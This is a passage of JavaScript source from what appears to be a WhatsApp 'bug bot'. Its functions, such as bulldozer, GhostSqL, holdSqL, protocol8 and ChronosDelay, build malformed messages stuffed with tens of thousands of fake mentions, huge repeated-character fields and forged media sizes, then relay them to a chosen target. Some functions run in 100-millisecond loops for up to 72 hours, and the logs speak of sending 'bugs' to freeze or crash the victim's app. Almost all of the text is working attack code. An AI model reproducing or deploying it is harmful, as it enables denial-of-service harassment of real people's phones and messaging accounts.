                            directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0"
                        }
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await langgxyz.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Rann - INVISIBLE" },
                        content: undefined
                    }
                ]
            }
        );
    }
}


async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await langgxyz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function exDelay(target) {
await langgxyz.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `Valhallaaaaa☯️\n https://t.me/rannloww\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}

async function execDelay(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 1000) {
        await exDelay(target);
        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function GhostSqL(target) {

  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: langgxyz.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await langgxyz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function holdSqL(target) {

async function holdbug(target) {
await langgxyz.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `${`${"\u0000"}`}`,
contextInfo: {
mentionedJid: [
"696969696969@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
],
quotedMessage: {
nativeFlowMessage: {
messageParamsJson: "{".repeat(100000)
}
},
},
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}

const totalDurationMs = 72 * 60 * 60 * 1000;
const startTime = Date.now();
let count = 0;

while (Date.now() - startTime < totalDurationMs) {
try {
if (count < 1000) {
await holdbug(target);
console.log(chalk.yellow(`process send bug to ${count + 1}/1000 > ${target}`));
count++;
} else {
console.log(chalk.green(`success send 1000 bugs to${target}`));
count = 0;
console.log(chalk.red("next send 1000 bugs"));
}
await new Promise(resolve => setTimeout(resolve, 100));
} catch (error) {
console.error(`error : ${error.message}`);
await new Promise(resolve => setTimeout(resolve, 100));
}
}
console.log(`sucessed bug after 3 days: ${count}`);
}

async function invisSqL(isTarget) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "Rann Officiall",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "Valhallaaa☯️"
          },
          nativeFlowMessage: {
            messageParamsJson: "\u0003".repeat(10000)
          }
        }
      }
    }
  }, {});

  await langgxyz.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function XStromFlowerDelay(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(target, message, {});

  await langgxyz.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  const audioMessage = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          )
        ]
      }
    }
  };

  const msg2 = generateWAMessageFromContent(target, audioMessage, {});

  await langgxyz.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await langgxyz.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "" },
            content: undefined
          }
        ]
      }
    );
  }
}


async function protocol8(jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𐍃𐌍𐌉𐌕𐌂𐌇" + "ោ៝".repeat(20000),
        title: "Rannn",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/snitch",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "Valhalaa"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "Valhalaaa",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(jid, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await langgxyz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await langgxyz.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "Rann Is Heree" },
                content: undefined
            }]
        });
    }
}

async function delayresponse(jid) {
const mentionedList = [
  "13135550002@s.whatsapp.net",
  ...Array.from({ length: 30000 }, () =>
    `1${Math.floor(Math.random() * 1e15)}@s.whatsapp.net`
  )
];
    
  const message = {
    buttonsResponseMessage: {
      selectedButtonId: "ោ៝".repeat(10000),
      selectedDisplayText: "ExploiterX",
      contextInfo: {
        mentionedJid: mentionedList,
          quotedMessage: {
              message: {
                text: "RANNN IS HEREE!!",
                footer: "XxX",
                buttons: [{
                    buttonId: `🚀`, 
                    buttonText: {
                        displayText: '~𑇂𑆵𑆴𑆿'.repeat(5000)
                    },
                    type: 1 
                }],
                headerType: 1,
                viewOnce: false
              }
          },          
      },
      type: 1
    }
  };

  const protoMessage = generateWAMessageFromContent(jid, {
    viewOnceMessage: {
      message
    }
  }, {});

  await langgxyz.relayMessage("status@broadcast", protoMessage.message, {
            messageId: protoMessage.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }
    
    
async function ChronosDelay(jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

const letakx = {
  "videoMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0&mms3=true",
    "mimetype": "video/mp4",
    "fileSha256": "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
    "fileLength": "327833",
    "seconds": 15,
    "mediaKey": "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
    "caption": "Valhlaaa V5",
    "height": 1248,
    "width": 704,
    "fileEncSha256": "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
    "directPath": "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc?ccb=11-4&oh=01_Q5Aa1gF9uZ9_ST2MIljavlsxcrIOpy9wWMykVDU4FCQeZAK-9w&oe=685D1E3B&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1748347294",
    "contextInfo": { isSampled: true, mentionedJid: mentionedList },
        "forwardedNewsletterMessageInfo": {
            "newsletterJid": "120363321780343299@newsletter",
            "serverMessageId": 1,
            "newsletterName": "Rannnn"
        },
    "streamingSidecar": "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
    "thumbnailDirectPath": "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
    "thumbnailSha256": "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
    "thumbnailEncSha256": "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
    "annotations": [
      {
        "embeddedContent": {
          "embeddedMusic": {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "ARE YOU KIDDING ME?!!!",
        title: "Xrl",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          }
        },
        "embeddedAction": true
      }
    ]
  }
}

    const xaudio = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
           contextInfo: {
           mentionedJid: mentionedList,
            caption: "Valhlaaa",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
           }
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { letakx } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, xaudio, {});
  
    for (const msg of [msg1, msg2]) {
        await langgxyz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
